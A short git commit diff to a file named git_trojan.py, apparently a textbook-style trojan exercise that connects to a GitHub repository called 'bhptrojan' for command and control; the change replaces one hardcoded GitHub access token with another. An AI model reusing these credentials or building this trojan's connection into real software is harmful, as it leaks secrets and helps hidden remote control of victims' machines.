d2ee6fc1eda4da6ceb4b99a9626e5e27ff6c3fa9
Genewsid <genewsid@gmail.com>
2022-09-07 20:16:05 +0900

    second commit

--- git_trojan.py
+++ git_trojan.py
@@ -12,7 +12,7 @@ from datetime import datetime
 def github_connect():
     with open('token') as f:
 #        token = f.read()
-        token = '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'
+        token = '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'
     user = 'Genewsid'
     sess = github3.login(token=token)
     return sess.repository(user, 'bhptrojan')
